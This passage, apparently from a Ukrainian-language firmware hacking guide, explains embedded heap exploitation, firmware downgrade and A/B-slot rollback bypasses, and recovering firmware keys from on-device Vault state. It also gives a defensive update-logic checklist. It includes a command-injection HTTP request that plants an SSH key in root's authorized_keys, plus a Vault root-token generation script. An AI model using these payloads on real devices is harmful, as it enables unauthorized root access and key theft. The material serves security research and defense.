- Перший коректний фрагмент із **малим** оголошеним загальним розміром, щоб змусити виділити невеликий блок у heap.
- Пізніший фрагмент з **очікуваним зсувом**, але більшим `chunk_len`.
- Підроблений локальний розмір пакета, який проходить нові перевірки, але все одно переповнює початково виділений буфер.

Якщо вразливий шлях доступний лише через логіку commissioning, експлуатація має включати достатню **емуляцію пристрою**, щоб перевести ціль у очікуваний стан завантаження моделі або blob перед надсиланням некоректних фрагментів.

### Виклик `free()` через протокол

У daemon вбудованих систем найпростіший спосіб запустити експлуатацію метаданих heap — часто не «чекати на очищення», а **спровокувати власну обробку помилок протоколу**:<sup>[[8]](#references)</sup>

- Надішліть некоректні наступні фрагменти, щоб перевести FSM у стани **повторної спроби** або **помилки**.
- Перевищте поріг повторних спроб, щоб daemon **скинув контекст** і звільнив пошкоджений буфер.
- Використайте цей передбачуваний `free()`, щоб запустити примітиви на боці алокатора до того, як процес аварійно завершиться з інших причин.

Це особливо корисно проти алокаторів, подібних до **musl/uClibc/dlmalloc**, у вбудованому Linux, де пошкодження метаданих чанків може перетворити логіку unlink/unbin на примітив запису. Стабільний підхід — пошкодити **поле розміру**, щоб перенаправити обхід алокатора на **підроблені чанки, підготовлені всередині переповненого буфера**, замість негайного перезапису справжніх вказівників bin і аварійного завершення процесу.

## Бінарна експлуатація та Proof-of-Concept

Розробка PoC для виявлених вразливостей вимагає глибокого розуміння архітектури цілі та програмування мовами низького рівня. Захисти бінарного середовища виконання у вбудованих системах трапляються рідко, але за їх наявності можуть знадобитися такі техніки, як Return Oriented Programming (ROP).

### Нотатки щодо експлуатації fastbin у uClibc (embedded Linux)

- **Fastbins і консолідація:** uClibc використовує fastbins, подібні до glibc. Пізніше велике виділення пам’яті може викликати `__malloc_consolidate()`, тому підроблений чанк має проходити перевірки (коректний розмір, `fd = 0`, а навколишні чанки мають вважатися «зайнятими»).<sup>[[6]](#references)</sup>
- **Бінарні файли без PIE за ввімкненого ASLR:** якщо ASLR увімкнено, але основний бінарний файл **не PIE**, адреси `.data/.bss` усередині бінарного файлу стабільні. Можна націлитися на область, яка вже нагадує коректний заголовок чанка heap, щоб розмістити виділення fastbin у **таблиці вказівників на функції**.
- **NUL для зупинки парсера:** під час парсингу JSON символ `\x00` у payload може зупинити парсинг, залишивши кінцеві байти під контролем атакувальника для pivot стека/ланцюжка ROP.
- **Shellcode через `/proc/self/mem`:** ланцюжок ROP, який викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може розмістити виконуваний shellcode у відомому відображенні пам’яті та передати керування на нього.

## Атаки зі зниженням версії firmware та незахищені механізми оновлення

Навіть якщо виробник реалізував криптографічну перевірку підпису образів firmware, **захист від відкату версії (downgrade) часто відсутній**. Якщо завантажувач або завантажувач відновлення лише перевіряє підпис за вбудованим відкритим ключем, але не порівнює *версію* (або монотонний лічильник) образу, який прошивається, атакувальник може легітимно встановити **старішу вразливу firmware із чинним підписом** і таким чином знову зробити доступними виправлені вразливості.<sup>[[4]](#references)</sup>

Типовий порядок атаки:

1. **Отримайте старіший підписаний образ**
   * Завантажте його з публічного порталу завантажень виробника, CDN або сайту підтримки.
   * Витягніть його з супровідних мобільних/настільних застосунків (наприклад, з `assets/firmware/` усередині Android APK).
   * Отримайте його зі сторонніх репозиторіїв, як-от VirusTotal, інтернет-архівів, форумів тощо.
2. **Завантажте образ на пристрій або надайте його йому** через будь-який доступний канал оновлення:
   * Вебінтерфейс, API мобільного застосунку, USB, TFTP, MQTT тощо.
   * Багато споживчих IoT-пристроїв мають *неавтентифіковані* кінцеві точки HTTP(S), які приймають Base64-кодовані blob-файли firmware, декодують їх на сервері та запускають відновлення/оновлення.
3. Після зниження версії використайте вразливість, виправлену в новішому випуску (наприклад, фільтр command injection, доданий пізніше).
4. За бажанням поверніть найновіший образ або вимкніть оновлення, щоб уникнути виявлення після отримання персистентності.

### Приклад: Command Injection після зниження версії

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

У вразливій (пониженій до старішої версії) прошивці параметр `md5` безпосередньо додається до команди shell без санітизації, що дає змогу впроваджувати довільні команди (у цьому випадку — увімкнути доступ root за SSH-ключем). У пізніших версіях прошивки додали базовий фільтр символів, але відсутність захисту від відкату версії зводить нанівець це виправлення.<sup>[[4]](#references)</sup>

### Вилучення прошивки з мобільних застосунків

Багато виробників додають повні образи прошивки до своїх супутніх мобільних застосунків, щоб застосунок міг оновлювати пристрій через Bluetooth/Wi-Fi. Ці пакети зазвичай зберігаються в APK/APEX у незашифрованому вигляді за шляхами на кшталт `assets/fw/` або `res/raw/`. За допомогою таких інструментів, як `apktool`, `ghidra` або навіть звичайний `unzip`, можна вилучити підписані образи, не торкаючись фізичного обладнання.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Обхід anti-rollback лише в updater у конструкціях зі слотами A/B

Деякі виробники реалізують **ratchet захисту від downgrade**, але лише в логіці *updater* (наприклад, у процедурі UDS через CAN, команді відновлення або userspace OTA-агенті). Якщо **bootloader** згодом перевіряє лише підпис/CRC образу та довіряє таблиці розділів або метаданим слота, захист від rollback усе ще можна обійти.<sup>[[7]](#references)</sup>

Типова слабка конструкція:

- Метадані firmware містять і дескриптор версії, і **security ratchet** / монотонний лічильник.
- Updater порівнює ratchet образу зі значенням у постійному сховищі й відхиляє старіші підписані образи.
- **Bootloader** не розбирає цей ratchet і перед завантаженням вибраного слота перевіряє лише заголовок, CRC і підпис.
- Активація слота зберігається окремо — у таблиці розділів або лічильнику поколінь для кожного слота — і **не прив’язана криптографічно** до точного digest перевіреної firmware.

У системах із двома слотами це створює примітив **перевірити один образ / завантажити інший**. Якщо зловмисник може змусити updater позначити слот B як наступну ціль завантаження за допомогою актуального підписаного образу, а згодом перезаписати слот B до перезавантаження, bootloader усе одно може завантажити старішу версію образу, оскільки довіряє лише вже зафіксованим метаданим слота.

Типовий шаблон зловживання:

1. Завантажити **актуальну підписану** firmware у пасивний слот і запустити звичайну процедуру перевірки/перемикання, щоб у розмітці цей слот було позначено як наступний активний.
2. **Поки що не перезавантажувати пристрій**. У тій самій сесії знову викликати процедуру підготовки/стирання слота.
3. Використати застарілий стан завантаження або логіку вибору слота, щоб updater стер **той самий фізичний слот**, який щойно було призначено активним.
4. Записати в цей слот **старішу, але все ще підписану** firmware.
5. Пропустити процедуру перевірки, яка застосовує ratchet, і перезавантажити пристрій напряму.
6. Bootloader вибирає призначений активним слот, перевіряє лише підпис/цілісність і завантажує старий образ.

На що звертати увагу під час реверсингу реалізацій оновлення A/B:

- Вибір слота на основі **прапорців, прочитаних під час завантаження**, які не оновлюються після успішного перемикання.
- Процедура на кшталт `prepare_passive_slot()`, яка стирає слот на основі застарілого стану замість **поточної зафіксованої розмітки**.
- Функція на кшталт `part_write_layout()`, яка лише збільшує **лічильник поколінь** / активний прапорець і не зберігає hash перевіреного образу.
- Перевірки ratchet, реалізовані в userspace або коді updater, але **не в ROM / bootloader / етапах secure boot**.
- Процедури стирання або відновлення, які залишають слот позначеним як придатний до завантаження навіть після видалення та перезапису його вмісту.

### Список перевірки логіки оновлення

* Чи достатньо захищені транспорт і автентифікація *endpoint оновлення* (TLS + автентифікація)?
* Чи порівнює пристрій **номери версій** або **монотонний лічильник anti-rollback** перед прошиванням?
* Чи перевіряється образ у ланцюжку secure boot (наприклад, чи перевіряє ROM-код підписи)?
* Чи застосовує **bootloader той самий ratchet**, що й updater, замість того, щоб перевіряти лише підпис/CRC?
* Чи **прив’язані метадані активації слота до digest/версії перевіреної firmware**, чи можна змінити слот після його активації?
* Після успішного перемикання слота пристрій примусово перезавантажується чи в тій самій сесії все ще доступні подальші процедури оновлення/стирання?
* Чи виконує userland-код додаткові перевірки коректності (наприклад, перевіряє дозволену карту розділів і номер моделі)?
* Чи повторно використовують *часткові* або *резервні* сценарії оновлення ту саму логіку перевірки?

> 💡 Якщо чогось із переліченого бракує, платформа, ймовірно, вразлива до rollback-атак.

## Відновлення ключів розшифрування firmware зі стану вбудованих KMS/Vault

Коли образ оновлення містить невеликі фрагменти метаданих у відкритому тексті та великий блок із високою ентропією, спершу проаналізуйте контейнер, а не намагайтеся одразу перебирати ключі:<sup>[[1]](#references)</sup>

- Виведіть заголовки, зміщення та межі рядків за допомогою `hexdump`, `xxd`, `strings -tx`, `base64 -d` і `binwalk -E`.
- `Salted__` зазвичай означає формат OpenSSL `enc`: наступні 8 байтів — це сіль, решта байтів — шифротекст.
- Поле Base64, яке декодується рівно у `256` байтів, — вагома ознака того, що перед вами шифротекст RSA-2048, яким обгорнуто випадковий пароль firmware або ключ сеансу.
- Відокремлені дані PGP у тому самому файлі часто забезпечують лише автентичність; не вважайте їх механізмом конфіденційності.

Якщо пошук статичних ключів (`grep`, `strings`, пошук PEM/PGP) нічого не дав, дослідіть **операційний шлях розшифрування**, а не лише шукайте приватні ключі:

- Декомпілюйте updater / бінарний файл керування та простежте, хто читає зашифрований блок, який helper/API його розпаковує і яке логічне ім’я ключа запитується.
- Пошукайте стан KMS у витягнутій кореневій файловій системі (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), а також файли служб і init-скрипти.
- Вважайте команди `vault operator unseal ...` у відкритому тексті, ключі відновлення, bootstrap-токени або локальні скрипти автоматичного розпечатування KMS еквівалентом матеріалу приватного ключа.

Якщо пристрій містить оригінальний бінарний файл Vault і backend сховища, відтворити це середовище зазвичай простіше, ніж повторно реалізовувати внутрішню логіку Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

З root-доступом до клонованого KMS:

- Зробіть transit keys експортованими лише в ізольованому клоні: `vault write transit/keys/<name>/config exportable=true`
- Експортуйте ключ unwrap: `vault read transit/export/encryption-key/<name>`
- Спробуйте використати відновлений RSA-ключ із точною парою padding/hash, яку застосовує KMS. Помилка дешифрування PKCS#1 v1.5 і помилка дешифрування OAEP за замовчуванням **не** доводять, що ключ неправильний: багато потоків на основі Vault використовують OAEP із SHA-256, тоді як у поширених бібліотеках за замовчуванням використовується SHA-1.
- Якщо payload починається з `Salted__`, точно відтворіть KDF OpenSSL від виробника (`EVP_BytesToKey`, на застарілих пристроях часто MD5), перш ніж намагатися виконати дешифрування AES-CBC.

Так проблема «зашитої» прошивки стає загальнішою: **відновіть робочі ключі на стороні пристрою, а потім офлайн відтворіть точні параметри unwrap + KDF**.
